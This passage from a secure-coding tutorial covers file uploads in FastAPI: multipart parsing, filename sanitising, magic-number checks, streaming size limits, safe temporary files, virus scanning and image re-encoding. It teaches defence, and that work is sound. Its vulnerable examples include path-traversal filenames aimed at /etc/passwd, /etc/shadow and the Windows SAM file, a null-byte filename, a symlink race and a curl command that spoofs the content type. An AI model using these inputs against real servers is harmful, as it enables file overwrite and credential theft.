            self.username_attempts[username],
            self.username_window
        )
        self.ip_attempts[ip_address] = self._cleanup_old_attempts(
            self.ip_attempts[ip_address],
            self.ip_window
        )

        # Check username rate limit
        if len(self.username_attempts[username]) >= self.max_username_attempts:
            failures = self.consecutive_failures[username]
            if failures > self.max_username_attempts:
                lockout_duration = self._get_lockout_duration(failures)
                return (False, f"Account locked for {lockout_duration.total_seconds() / 60:.0f} minutes")
            return (False, "Too many attempts for this username. Try again in 15 minutes.")

        # Check IP rate limit
        if len(self.ip_attempts[ip_address]) >= self.max_ip_attempts:
            return (False, "Too many attempts from this IP. Try again in 1 hour.")

        return (True, "")

    def record_attempt(self, username: str, ip_address: str, success: bool):
        now = datetime.utcnow()

        if success:
            # Reset counters on successful login
            self.consecutive_failures[username] = 0
            # Don't clear attempts history (still rate limit successful attempts)
        else:
            # Record failed attempt
            self.username_attempts[username].append(now)
            self.ip_attempts[ip_address].append(now)
            self.consecutive_failures[username] += 1

# Usage in login endpoint:
rate_limiter = LoginRateLimiter()

@app.post("/api/login")
async def login(credentials: LoginRequest, request: Request):
    ip_address = request.client.host

    # Check rate limit
    allowed, reason = rate_limiter.is_allowed(credentials.username, ip_address)
    if not allowed:
        raise HTTPException(status_code=429, detail=reason)

    # Verify credentials
    user = verify_credentials(credentials.username, credentials.password)

    # Record attempt
    rate_limiter.record_attempt(credentials.username, ip_address, success=bool(user))

    if not user:
        raise HTTPException(status_code=401, detail="Invalid credentials")

    # Create session/token
    ...
```

---

Ready for Level 14 when you're ready. Next level will cover file uploads, multipart/form-data parsing, file validation, virus scanning integration, and the security implications of accepting user files.

## **Level 14 Enhancement: File Uploads - Accepting User Content**

**Reference:** Your tutorial implements file upload functionality with validation and security checks.

**Depth Needed:** File uploads are one of the most dangerous features to implement. They open attack vectors for malware, path traversal, resource exhaustion, and code execution. This requires deep understanding of HTTP multipart encoding, file system security, and validation strategies.

---

### **Part 1: HTTP Multipart/Form-Data - The Upload Protocol**

**Why Not Just POST JSON?**

```python
# Can't do this for binary files:
{
    "filename": "image.jpg",
    "content": "ÿØÿà\x00\x10JFIF..."  # Binary data breaks JSON!
}

# JSON requires text-based encoding
# Base64 encoding adds 33% overhead:
original_size = 1 MB
base64_size = 1.33 MB  # Wasteful!

# Solution: multipart/form-data (binary-safe)
```

**The Multipart Format:**

```http
POST /api/upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 12345

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="description"

This is a file description
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.mcam"
Content-Type: application/octet-stream

<binary file content here>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**Parsing Multipart Data:**

```python
# How FastAPI/Starlette parses multipart uploads:

def parse_multipart(body: bytes, boundary: str) -> dict:
    """
    Parse multipart/form-data.

    Algorithm:
    1. Split body by boundary markers
    2. Parse each part's headers
    3. Extract part's content

    Time Complexity: O(n) where n = body size
    Space Complexity: O(n) - must buffer entire body
    """
    parts = {}

    # Boundary markers
    boundary_bytes = f'--{boundary}'.encode()
    end_boundary_bytes = f'--{boundary}--'.encode()

    # Split by boundary
    sections = body.split(boundary_bytes)

    for section in sections[1:]:  # Skip first (empty)
        if section.startswith(b'--'):  # End boundary
            break

        # Split headers from content
        header_end = section.find(b'\r\n\r\n')
        if header_end == -1:
            continue

        headers_bytes = section[:header_end]
        content = section[header_end + 4:]  # +4 for \r\n\r\n

        # Remove trailing \r\n
        if content.endswith(b'\r\n'):
            content = content[:-2]

        # Parse Content-Disposition header
        headers = headers_bytes.decode('utf-8')
        disposition = parse_content_disposition(headers)

        if 'filename' in disposition:
            # File upload
            parts[disposition['name']] = {
                'filename': disposition['filename'],
                'content': content,
                'content_type': parse_content_type(headers)
            }
        else:
            # Regular form field
            parts[disposition['name']] = content.decode('utf-8')

    return parts

def parse_content_disposition(headers: str) -> dict:
    """
    Parse Content-Disposition header.

    Example:
    Content-Disposition: form-data; name="file"; filename="test.txt"

    Returns:
    {'name': 'file', 'filename': 'test.txt'}
    """
    disposition = {}

    for line in headers.split('\r\n'):
        if line.startswith('Content-Disposition:'):
            # Extract parameters
            parts = line.split(';')
            for part in parts[1:]:  # Skip "form-data"
                if '=' in part:
                    key, value = part.split('=', 1)
                    key = key.strip()
                    value = value.strip().strip('"')
                    disposition[key] = value

    return disposition
```

**Why Boundary is Critical:**

```python
# Boundary must be unique and not appear in content
# Otherwise, parsing breaks!

# BAD boundary:
boundary = "---"
content = b"Some text --- with boundary in it"
# Parser thinks content ends at "---"!

# GOOD boundary:
# Browser generates random string:
boundary = "----WebKitFormBoundary" + random_string(16)
# Probability of collision: negligible

# Boundary requirements (RFC 2046):
# - 1 to 70 characters
# - Must not appear in any part content
# - Usually contains random alphanumeric characters
```

---

### **Part 2: File Upload Security - The Attack Surface**

**Attack Vector 1: Path Traversal**

```python
# VULNERABLE CODE:
@app.post("/upload")
async def upload(file: UploadFile):
    filename = file.filename  # User controls this!

    # Save file
    file_path = os.path.join(UPLOAD_DIR, filename)
    with open(file_path, 'wb') as f:
        f.write(await file.read())

# Attack:
# User uploads with filename: "../../../etc/passwd"
# file_path becomes: /uploads/../../../etc/passwd
# Normalized to: /etc/passwd
# Attacker overwrites system file!

# Other malicious filenames:
"..\\..\\..\\Windows\\System32\\config\\SAM"  # Windows
"/etc/shadow"                                  # Absolute path
"test.txt\x00.exe"                            # Null byte injection
"test.php"                                     # Code execution if served
```

**Secure Filename Sanitization:**

```python
import os
import re
from pathlib import Path

def sanitize_filename(filename: str) -> str:
    """
    Sanitize filename to prevent security issues.

    Security checks:
    1. Remove path separators (/, \)
    2. Remove parent directory references (..)
    3. Remove null bytes
    4. Limit length
    5. Ensure valid characters only
    6. Prevent reserved names (Windows)

    Time Complexity: O(n) where n = filename length
    """
    if not filename:
        raise ValueError("Filename cannot be empty")

    # 1. Remove path components (only keep basename)
    filename = os.path.basename(filename)

    # 2. Remove null bytes (can cause issues)
    filename = filename.replace('\x00', '')

    # 3. Remove or replace dangerous characters
    # Allow: alphanumeric, underscore, hyphen, period
    filename = re.sub(r'[^a-zA-Z0-9_\-\.]', '_', filename)

    # 4. Remove leading dots (hidden files on Unix)
    filename = filename.lstrip('.')

    # 5. Check for parent directory references
    if '..' in filename:
        filename = filename.replace('..', '')

    # 6. Prevent Windows reserved names
    reserved_names = {
        'CON', 'PRN', 'AUX', 'NUL',
        'COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9',
        'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9'
    }
    name_without_ext = filename.rsplit('.', 1)[0].upper()
    if name_without_ext in reserved_names:
        filename = f"file_{filename}"

    # 7. Limit length (255 is filesystem limit, but be conservative)
    max_length = 200
    if len(filename) > max_length:
        # Keep extension
        name, ext = os.path.splitext(filename)
        filename = name[:max_length - len(ext)] + ext

    # 8. Ensure not empty after sanitization
    if not filename or filename == '.':
        filename = "unnamed_file"

    return filename

# Additional: Generate unique filename to prevent overwrites
def generate_unique_filename(original_filename: str, upload_dir: str) -> str:
    """
    Generate unique filename by adding counter if file exists.

    Examples:
    test.txt → test.txt (if doesn't exist)
    test.txt → test_1.txt (if test.txt exists)
    test.txt → test_2.txt (if test_1.txt exists)
    """
    filename = sanitize_filename(original_filename)
    file_path = os.path.join(upload_dir, filename)

    if not os.path.exists(file_path):
        return filename

    # File exists, add counter
    name, ext = os.path.splitext(filename)
    counter = 1

    while True:
        new_filename = f"{name}_{counter}{ext}"
        file_path = os.path.join(upload_dir, new_filename)

        if not os.path.exists(file_path):
            return new_filename

        counter += 1

        # Safety: prevent infinite loop
        if counter > 10000:
            # Generate random filename instead
            import secrets
            random_suffix = secrets.token_hex(8)
            return f"{name}_{random_suffix}{ext}"

# Better: Use UUIDs for guaranteed uniqueness
import uuid

def generate_uuid_filename(original_filename: str) -> str:
    """
    Generate UUID-based filename.

    Pros:
    - Guaranteed unique
    - No directory listing needed
    - Predictable length

    Cons:
    - Loses original filename (store separately in metadata)
    """
    ext = os.path.splitext(original_filename)[1]
    return f"{uuid.uuid4()}{ext}"
```

**Attack Vector 2: File Type Validation Bypass**

```python
# VULNERABLE: Trusting file extension
def is_allowed_file(filename: str) -> bool:
    allowed_extensions = {'.jpg', '.png', '.pdf'}
    ext = os.path.splitext(filename)[1].lower()
    return ext in allowed_extensions

# Attack: Upload malicious.php.jpg
# Extension is .jpg, passes check
# But if server misconfigured, might execute as PHP!

# VULNERABLE: Trusting Content-Type header
@app.post("/upload")
async def upload(file: UploadFile):
    if file.content_type not in ['image/jpeg', 'image/png']:
        raise HTTPException(400, "Invalid file type")
    # Save file...

# Attack: User controls Content-Type header!
# curl -F "file=@malware.exe;type=image/jpeg" ...
# Content-Type says JPEG, but file is EXE!
```

**Secure File Type Validation:**

```python
import mimetypes
import magic  # python-magic library

def validate_file_type(file_content: bytes, filename: str,
                       allowed_types: set) -> tuple[bool, str]:
    """
    Validate file type using multiple methods.

    Methods (in order of reliability):
    1. Magic number detection (most reliable)
    2. Content analysis
    3. Extension (least reliable, only as fallback)

    Args:
        file_content: First few KB of file
        filename: Original filename
        allowed_types: Set of MIME types like {'image/jpeg', 'application/pdf'}

    Returns:
        (is_valid, detected_mime_type)
    """
    # Method 1: Magic number detection
    # Reads file signature (first bytes)
    try:
        mime = magic.from_buffer(file_content, mime=True)

        if mime in allowed_types:
            return True, mime

    except Exception as e:
        print(f"Magic number detection failed: {e}")

    # Method 2: Extension-based (fallback)
    mime_type, _ = mimetypes.guess_type(filename)

    if mime_type and mime_type in allowed_types:
        return True, mime_type

    return False, mime or mime_type or "unknown"

# Magic numbers for common file types:
FILE_SIGNATURES = {
    'image/jpeg': [
        b'\xFF\xD8\xFF\xE0',  # JPEG JFIF
        b'\xFF\xD8\xFF\xE1',  # JPEG EXIF
    ],
    'image/png': [
        b'\x89PNG\r\n\x1a\n',
    ],
    'application/pdf': [
        b'%PDF-',
    ],
    'application/zip': [
        b'PK\x03\x04',
        b'PK\x05\x06',
    ],
    'image/gif': [
        b'GIF87a',
        b'GIF89a',
    ]
}

def check_magic_number(file_content: bytes, expected_type: str) -> bool:
    """
    Check if file starts with expected magic number.

    Time Complexity: O(1) - checks only first few bytes
    """
    if expected_type not in FILE_SIGNATURES:
        return False

    for signature in FILE_SIGNATURES[expected_type]:
        if file_content.startswith(signature):
            return True

    return False

# Example usage:
@app.post("/upload")
async def upload(file: UploadFile):
    # Read first 2KB for magic number detection
    header = await file.read(2048)
    await file.seek(0)  # Reset for full read later

    # Validate
    is_valid, mime_type = validate_file_type(
        header,
        file.filename,
        allowed_types={'image/jpeg', 'image/png', 'application/pdf'}
    )

    if not is_valid:
        raise HTTPException(
            status_code=400,
            detail=f"File type not allowed. Detected: {mime_type}"
        )

    # Proceed with upload
    ...
```

**Magic Number Database:**

```python
# Comprehensive magic number reference:
MAGIC_NUMBERS = {
    # Images
    'JPEG':     b'\xFF\xD8\xFF',
    'PNG':      b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A',
    'GIF':      b'\x47\x49\x46\x38',
    'BMP':      b'\x42\x4D',
    'TIFF_LE':  b'\x49\x49\x2A\x00',  # Little-endian
    'TIFF_BE':  b'\x4D\x4D\x00\x2A',  # Big-endian
    'WEBP':     b'\x52\x49\x46\x46',  # Followed by WEBP

    # Documents
    'PDF':      b'\x25\x50\x44\x46',  # %PDF
    'DOCX':     b'\x50\x4B\x03\x04',  # ZIP archive (check later for _rels)
    'RTF':      b'\x7B\x5C\x72\x74\x66',  # {\rtf

    # Archives
    'ZIP':      b'\x50\x4B\x03\x04',
    'RAR':      b'\x52\x61\x72\x21\x1A\x07',
    'GZIP':     b'\x1F\x8B',
    '7Z':       b'\x37\x7A\xBC\xAF\x27\x1C',

    # Executables (NEVER allow these!)
    'EXE_DOS':  b'\x4D\x5A',  # MZ
    'ELF':      b'\x7F\x45\x4C\x46',  # ELF
    'MACH_32':  b'\xFE\xED\xFA\xCE',  # Mach-O 32-bit
    'MACH_64':  b'\xFE\xED\xFA\xCF',  # Mach-O 64-bit

    # Scripts (Be careful!)
    'SHELL':    b'\x23\x21',  # #! (shebang)
}

# Polymorphic malware detection:
# Some malware disguises signatures
# Need deeper content analysis, not just magic numbers
```

---

### **Part 3: File Size Limits - Preventing Resource Exhaustion**

**The Memory Problem:**

```python
# VULNERABLE: Loading entire file into memory
@app.post("/upload")
async def upload(file: UploadFile):
    content = await file.read()  # If file is 5GB, needs 5GB RAM!
    # Process content...

# Attack: Upload many large files simultaneously
# Server runs out of memory, crashes
```

**Size Limit Implementation:**

```python
from fastapi import UploadFile, HTTPException

MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB

async def validate_file_size(file: UploadFile, max_size: int = MAX_FILE_SIZE) -> int:
    """
    Validate file size without loading entire file.

    Returns: File size in bytes
    Raises: HTTPException if too large

    Time Complexity: O(n) where n = file size (must read to measure)
    Space Complexity: O(1) - uses small buffer
    """
    size = 0
    chunk_size = 1024 * 1024  # 1 MB chunks

    while True:
        chunk = await file.read(chunk_size)
        if not chunk:
            break

        size += len(chunk)

        if size > max_size:
            raise HTTPException(
                status_code=413,  # 413 Payload Too Large
                detail=f"File too large. Maximum size: {max_size / (1024**2):.1f} MB"
            )

    # Reset file pointer
    await file.seek(0)

    return size

# Better: Use Content-Length header (if available)
@app.post("/upload")
async def upload(file: UploadFile, content_length: int = Header(None)):
    # Check Content-Length before reading file
    if content_length and content_length > MAX_FILE_SIZE:
        raise HTTPException(
            status_code=413,
            detail="File too large"
        )

    # Still validate actual size (Content-Length can lie!)
    actual_size = await validate_file_size(file)

    # Proceed with upload
    ...
```

**Streaming Upload (Memory-Efficient):**

```python
async def save_upload_streaming(file: UploadFile, destination: str,
                                 max_size: int = MAX_FILE_SIZE) -> int:
    """
    Save uploaded file using streaming (constant memory usage).

    Instead of reading entire file into RAM:
    - Read small chunks
    - Write to disk immediately
    - Discard chunk from memory

    Time Complexity: O(n) where n = file size
    Space Complexity: O(1) - only chunk in memory at a time

    Returns: Total bytes written
    """
    total_size = 0
    chunk_size = 1024 * 1024  # 1 MB chunks

    try:
        with open(destination, 'wb') as f:
            while True:
                chunk = await file.read(chunk_size)
                if not chunk:
                    break

                # Check size limit
                total_size += len(chunk)
                if total_size > max_size:
                    # Delete partial file
                    f.close()
                    os.remove(destination)
                    raise HTTPException(413, "File too large")

                # Write chunk to disk
                f.write(chunk)

    except Exception as e:
        # Cleanup on error
        if os.path.exists(destination):
            os.remove(destination)
        raise e

    return total_size

# Memory usage comparison:
# Non-streaming (100 MB file): 100 MB RAM
# Streaming (100 MB file):     1 MB RAM (chunk size)
```

---

### **Part 4: Temporary File Handling - The Race Condition**

**The Problem:**

```python
# VULNERABLE: Predictable temporary filenames
@app.post("/upload")
async def upload(file: UploadFile):
    temp_path = f"/tmp/{file.filename}"  # Predictable!

    # Save to temp
    with open(temp_path, 'wb') as f:
        f.write(await file.read())

    # Process file
    process_file(temp_path)

    # Delete temp
    os.remove(temp_path)

# Attack: Symlink race condition
# 1. Attacker creates symlink: /tmp/upload.txt → /etc/passwd
# 2. User uploads as upload.txt
# 3. Server overwrites /etc/passwd!
```

**Secure Temporary Files:**

```python
import tempfile
import os
from pathlib import Path

def secure_temp_file(suffix: str = '') -> tuple[str, int]:
    """
    Create secure temporary file.

    Uses tempfile.mkstemp():
    - Creates file with unpredictable name
    - Opens with O_EXCL (fails if exists)
    - Sets restrictive permissions (0600)

    Returns: (file_path, file_descriptor)
    """
    fd, path = tempfile.mkstemp(suffix=suffix, dir=tempfile.gettempdir())
    return path, fd

# Usage:
@app.post("/upload")
async def upload(file: UploadFile):
    # Create secure temp file
    temp_path, temp_fd = secure_temp_file(suffix='.tmp')

    try:
        # Write to temp file using file descriptor
        with os.fdopen(temp_fd, 'wb') as f:
            content = await file.read()
            f.write(content)

        # Process file
        process_file(temp_path)

        # Move to final destination
        final_path = os.path.join(UPLOAD_DIR, sanitize_filename(file.filename))
        shutil.move(temp_path, final_path)

    except Exception as e:
        # Cleanup on error
        if os.path.exists(temp_path):
            os.remove(temp_path)
        raise e

    return {"filename": file.filename, "size": len(content)}

# Why tempfile.mkstemp() is secure:
# 1. Random name: /tmp/tmp_abc123xyz.tmp (not predictable)
# 2. Atomic creation: Uses O_EXCL flag (fails if file exists)
# 3. Restricted permissions: Only owner can read/write
# 4. No race condition: Can't be symlink-attacked
```

**The mkstemp Algorithm:**

```python
def mkstemp_simplified(suffix='', prefix='tmp', dir=None):
    """
    Simplified version of tempfile.mkstemp().

    Algorithm:
    1. Generate random filename
    2. Try to create with O_EXCL (exclusive)
    3. If exists, try again with new random name
    4. Repeat until success or max attempts

    Time Complexity: O(1) expected (random collision unlikely)
    Space Complexity: O(1)
    """
    if dir is None:
        dir = tempfile.gettempdir()

    max_attempts = 10000

    for _ in range(max_attempts):
        # Generate random name
        random_part = ''.join(
            secrets.choice('abcdefghijklmnopqrstuvwxyz0123456789')
            for _ in range(8)
        )
        filename = f"{prefix}_{random_part}{suffix}"
        filepath = os.path.join(dir, filename)

        try:
            # Try to create file exclusively
            # os.O_EXCL: Fail if file exists (prevents race)
            # os.O_CREAT: Create file
            # os.O_RDWR: Read/write access
            fd = os.open(
                filepath,
                os.O_CREAT | os.O_EXCL | os.O_RDWR,
                0o600  # Permissions: rw-------
            )

            return filepath, fd

        except FileExistsError:
            # Collision, try again
            continue

    raise IOError("Failed to create temporary file")

# Probability of collision:
# 36^8 possible names = 2.8 trillion combinations
# Probability of collision in 10,000 attempts ≈ 0.00000036%
```

---

### **Part 5: Virus Scanning - Malware Detection**

**Why Client-Side Antivirus Isn't Enough:**

```
User's Computer                        Server
─────────────────────────────────────────────────────────
Antivirus installed    ───────────>    No protection
User can disable       ───────────>    Files stored
Attacker's computer    ───────────>    Infects other users
has no antivirus

Conclusion: Server MUST scan uploaded files
```

**ClamAV Integration:**

```python
import clamd
import asyncio

class VirusScanner:
    """
    Integrate with ClamAV daemon for virus scanning.

    Requires: ClamAV daemon running (clamd)
    Install: apt-get install clamav-daemon
    """
    def __init__(self, host='localhost', port=3310):
        self.clamd = clamd.ClamdNetworkSocket(host, port)

    def scan_file(self, file_path: str) -> tuple[bool, str]:
        """
        Scan file for viruses.

        Returns: (is_safe, result_message)

        Time Complexity: O(n) where n = file size
        (ClamAV reads entire file)
        """
        try:
            result = self.clamd.scan(file_path)

            if result is None:
                # File is clean
                return True, "Clean"

            # Virus found
            file_result = result.get(file_path, ('FOUND', 'Unknown virus'))
            status, virus_name = file_result

            return False, f"Virus detected: {virus_name}"

        except clamd.ConnectionError:
            # ClamAV daemon not available
            # Decision: Fail open or fail closed?
            # Fail closed (reject): More secure
            # Fail open (accept): Better availability
            raise HTTPException(
                status_code=503,
                detail="Virus scanning service unavailable"
            )

        except Exception as e:
            print(f"Scan error: {e}")
            return False, f"Scan error: {str(e)}"

    async def scan_file_async(self, file_path: str) -> tuple[bool, str]:
        """
        Async wrapper for virus scanning.
        Runs in thread pool to avoid blocking.
        """
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self.scan_file, file_path)

# Usage in upload endpoint:
virus_scanner = VirusScanner()

@app.post("/upload")
async def upload(file: UploadFile):
    # Save to temporary file
    temp_path, temp_fd = secure_temp_file(suffix='.tmp')

    try:
        with os.fdopen(temp_fd, 'wb') as f:
            content = await file.read()
            f.write(content)

        # Scan for viruses
        is_safe, scan_result = await virus_scanner.scan_file_async(temp_path)

        if not is_safe:
            os.remove(temp_path)
            raise HTTPException(
                status_code=400,
                detail=f"File rejected: {scan_result}"
            )

        # File is safe, move to final location
        final_path = os.path.join(UPLOAD_DIR, generate_uuid_filename(file.filename))
        shutil.move(temp_path, final_path)

    except Exception as e:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        raise e
```

**How ClamAV Works:**

```python
# ClamAV detection methods:

# 1. Signature-based detection
# Looks for known patterns (signatures) of malware
virus_signatures = {
    'Eicar-Test-Signature': b'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
    'Trojan.Generic.12345': b'\x4D\x5A\x90\x00\x03...',  # PE header + specific bytes
    # ... millions of signatures
}

def signature_scan(file_content: bytes) -> bool:
    """
    Check if file contains known malware signatures.

    Time Complexity: O(n * m) where:
    - n = file size
    - m = number of signatures

    Optimized with:
    - Aho-Corasick algorithm for multi-pattern matching
    - Hash-based quick lookups
    """
    for signature_name, signature_bytes in virus_signatures.items():
        if signature_bytes in file_content:
            return True, signature_name
    return False, None

# 2. Heuristic detection
# Analyzes behavior patterns (e.g., tries to modify system files)

# 3. Bytecode detection
# ClamAV can run bytecode for complex detection logic

# Limitations:
# - Only detects known malware (signatures need updates)
# - Zero-day exploits not detected
# - Polymorphic malware can evade signatures
# - Encrypted files can't be scanned
```

---

### **Part 6: Image Processing - Preventing Exploits**

**Image-Based Attacks:**

```python
# Attack 1: Image bomb (decompression bomb)
# Small file (1 KB) expands to huge image (10 GB)
# Example: 42.zip (42 KB → 4.5 PB after recursive decompression)

# Attack 2: Image processing exploit
# Malformed image crashes image library
# Buffer overflow in JPEG decoder
# Remote code execution via PNG parser

# Attack 3: Metadata injection
# EXIF data contains malicious script
# XSS via image metadata
```

**Safe Image Processing:**

```python
from PIL import Image
import io

MAX_IMAGE_PIXELS = 100_000_000  # 100 megapixels

def validate_and_process_image(file_content: bytes, max_size: tuple = (4096, 4096)) -> bytes:
    """
    Safely process and validate image.

    Security measures:
    1. Limit max pixels (prevent decompression bombs)
    2. Re-encode image (strips exploits)
    3. Remove metadata (EXIF, IPTC, XMP)
    4. Resize if too large

    Returns: Cleaned image bytes
    """
    # Set PIL decompression bomb protection
    Image.MAX_IMAGE_PIXELS = MAX_IMAGE_PIXELS

    try:
        # Open and validate image
        img = Image.open(io.BytesIO(file_content))

        # Check dimensions
        width, height = img.size
        if width * height > MAX_IMAGE_PIXELS:
            raise ValueError("Image too large (decompression bomb?)")

        # Resize if needed
        if width > max_size[0] or height > max_size[1]:
            img.thumbnail(max_size, Image.Resampling.LANCZOS)

        # Re-encode to strip metadata and potential exploits
        # This creates a new, clean image
        output = io.BytesIO()

        # Convert to RGB (handles CMYK, palette, etc.)
        if img.mode not in ('RGB', 'RGBA'):
            img = img.convert('RGB')

        # Save as JPEG (strips all metadata)
        img.save(output, format='JPEG', quality=85, optimize=True)

        # Get bytes
        output.seek(0)
        return output.read()

    except Image.DecompressionBombError:
        raise ValueError("Image decompression bomb detected")

    except Exception as e:
        raise ValueError(f"Invalid or malicious image: {str(e)}")

# Usage:
@app.post("/upload-image")
async def upload_image(file: UploadFile):
    # Read file
    content = await file.read()

    # Validate file type
    if not content.startswith(b'\xFF\xD8\xFF'):  # JPEG magic number
        raise HTTPException(400, "Only JPEG images allowed")

    # Process image safely
    try:
        cleaned_image = validate_and_process_image(content)
    except ValueError as e:
        raise HTTPException(400, str(e))

    # Save cleaned image
    filename = generate_uuid_filename(file.filename)
    filepath = os.path.join(UPLOAD_DIR, filename)

    with open(filepath, 'wb') as f:
        f.write(cleaned_image)

    return {"filename": filename}
```

**EXIF Metadata Security:**

```python
from PIL import Image
from PIL.ExifTags import TAGS

def extract_exif_safely(image_path: str) -> dict:
    """
    Extract EXIF data safely (read-only).

    Warning: EXIF can contain:
    - GPS coordinates (privacy issue)
    - Camera model (fingerprinting)
    - Software used (attack intel)
    - Malicious payloads (if processed unsafely)
    """
    img = Image.open(image_path)
    exif_data = {}

    if hasattr(img, '_getexif') and img._getexif():
        exif = img._getexif()

        for tag_id, value in exif.items():
            tag_name = TAGS.get(tag_id, tag_id)

            # Sanitize value (prevent injection)
            if isinstance(value, bytes):
                try:
                    value = value.decode('utf-8', errors='ignore')
                except:
                    value = "<binary data>"

            # Limit string length
            if isinstance(value, str):
                value = value[:500]

            exif_data[tag_name] = value

    return exif_data

def strip_exif(image_path: str, output_path: str):
    """
    Remove all EXIF data from image.

    Use when storing user images to protect privacy.
    """
    img = Image.open(image_path)

    # Get image data without EXIF
    data = list(img.getdata())
    image_without_exif = Image.new(img.mode, img.size)
    image_without_exif.putdata(data)

    # Save
    image_without_exif.save(output_path)
```

---

### **Part 7: FastAPI Upload Endpoint - Complete Implementation**

```python
from fastapi import FastAPI, UploadFile, File, HTTPException, Header
from fastapi.responses import JSONResponse
import shutil
import os
from pathlib import Path

app = FastAPI()

# Configuration
UPLOAD_DIR = Path("./uploads")
UPLOAD_DIR.mkdir(exist_ok=True)
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB
ALLOWED_EXTENSIONS = {'.mcam', '.jpg', '.png', '.pdf'}
ALLOWED_MIME_TYPES = {
    'application/octet-stream',  # .mcam files
    'image/jpeg',
    'image/png',
    'application/pdf'
}

@app.post("/api/upload")
async def upload_file(
    file: UploadFile = File(...),
    description: str = Form(None),
    content_length: int = Header(None)
):
    """
    Upload file with comprehensive security checks.

    Security measures:
    1. File size validation
    2. File type validation (magic number)
    3. Filename sanitization
    4. Virus scanning
    5. Secure temporary file handling
    6. Metadata storage

    Time Complexity: O(n) where n = file size
    Space Complexity: O(1) with streaming
    """
    # 1. Check Content-Length header
    if content_length and content_length > MAX_FILE_SIZE:
        raise HTTPException(
            status_code=413,
            detail=f"File too large. Max size: {MAX_FILE_SIZE / (1024**2):.1f} MB"
        )

    # 2. Validate filename
    try:
        clean_filename = sanitize_filename(file.filename)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    # 3. Check extension
    ext = os.path.splitext(clean_filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(
            status_code=400,
            detail=f"File type not allowed. Allowed: {', '.join(ALLOWED_EXTENSIONS)}"
        )

    # 4. Create secure temporary file
    temp_path, temp_fd = secure_temp_file(suffix=ext)

    try:
        # 5. Stream file to disk with size validation
        total_size = 0
        chunk_size = 1024 * 1024  # 1 MB

        with os.fdopen(temp_fd, 'wb') as f:
            while True:
                chunk = await file.read(chunk_size)
                if not chunk:
                    break

                total_size += len(chunk)
                if total_size > MAX_FILE_SIZE:
                    raise HTTPException(
                        status_code=413,
                        detail="File too large"
                    )

                f.write(chunk)

        # 6. Validate file type (magic number)
        with open(temp_path, 'rb') as f:
            header = f.read(2048)

        is_valid, detected_type = validate_file_type(
            header, clean_filename, ALLOWED_MIME_TYPES
        )

        if not is_valid:
            raise HTTPException(
                status_code=400,
                detail=f"Invalid file type. Detected: {detected_type}"
            )

        # 7. Virus scan (if enabled)
        if VIRUS_SCANNING_ENABLED:
            is_safe, scan_result = await virus_scanner.scan_file_async(temp_path)
            if not is_safe:
                raise HTTPException(
                    status_code=400,
                    detail=f"File rejected: {scan_result}"
                )

        # 8. Generate unique filename
        unique_filename = generate_uuid_filename(clean_filename)
        final_path = UPLOAD_DIR / unique_filename

        # 9. Move to final location
        shutil.move(temp_path, final_path)

        # 10. Store metadata
        metadata = load_metadata()
        metadata[unique_filename] = {
            "original_filename": file.filename,
            "description": description or "",
            "size": total_size,
            "mime_type": detected_type,
            "uploaded_at": datetime.utcnow().isoformat() + 'Z',
            "uploaded_by": "user@example.com"  # From auth
        }
        save_metadata(metadata)

        return JSONResponse(
            status_code=201,
            content={
                "filename": unique_filename,
                "original_filename": file.filename,
                "size": total_size,
                "mime_type": detected_type
            }
        )

    except HTTPException:
        # Re-raise HTTP exceptions
        if os.path.exists(temp_path):
            os.remove(temp_path)
        raise

    except Exception as e:
        # Cleanup and return error
        if os.path.exists(temp_path):
            os.remove(temp_path)

        raise HTTPException(
            status_code=500,
            detail=f"Upload failed: {str(e)}"
        )
```

---

### **Practice Exercise 1: Implement Chunked Upload**

```python
class ChunkedUploadManager:
    """
    Handle large file uploads in chunks.

    Benefits:
    - Resume interrupted uploads
    - Better progress tracking
    - Lower memory usage

    Protocol:
    1. Client: POST /upload/start → Get upload_id
    2. Client: POST /upload/chunk (multiple times)
    3. Client: POST /upload/complete → Finalize
    """

    def __init__(self, upload_dir: str):
        self.upload_dir = Path(upload_dir)
        self.chunks_dir = self.upload_dir / "chunks"
        self.chunks_dir.mkdir(exist_ok=True)
        self.uploads = {}  # upload_id → upload_info

    def start_upload(self, filename: str, total_size: int,
                     total_chunks: int) -> str:
        """
        Initialize chunked upload.

        Returns: upload_id
        """
        # Your implementation here
        pass

    def upload_chunk(self, upload_id: str, chunk_index: int,
                     chunk_data: bytes) -> dict:
        """
        Upload a single chunk.

        Returns: {uploaded_chunks, total_chunks, complete}
        """
        # Your implementation here
        pass

    def complete_upload(self, upload_id: str) -> str:
        """
        Finalize upload by combining chunks.

        Returns: final_filename
        """
        # Your implementation here
        pass

    def cancel_upload(self, upload_id: str):
        """
        Cancel upload and cleanup chunks.
        """
        # Your implementation here
        pass

# Test:
manager = ChunkedUploadManager("./uploads")

# Start upload
upload_id = manager.start_upload("large_file.zip", 50_000_000, 50)

# Upload chunks
for i in range(50):
    chunk = b"x" * 1_000_000  # 1 MB chunk
    result = manager.upload_chunk(upload_id, i, chunk)
    print(f"Progress: {result['uploaded_chunks']}/{result['total_chunks']}")

# Complete
final_file = manager.complete_upload(upload_id)

# Solution:
import uuid
import hashlib

class ChunkedUploadManager:
    def __init__(self, upload_dir: str):
        self.upload_dir = Path(upload_dir)
        self.chunks_dir = self.upload_dir / "chunks"
        self.chunks_dir.mkdir(exist_ok=True, parents=True)
        self.uploads = {}

    def start_upload(self, filename: str, total_size: int,
                     total_chunks: int) -> str:
        upload_id = str(uuid.uuid4())

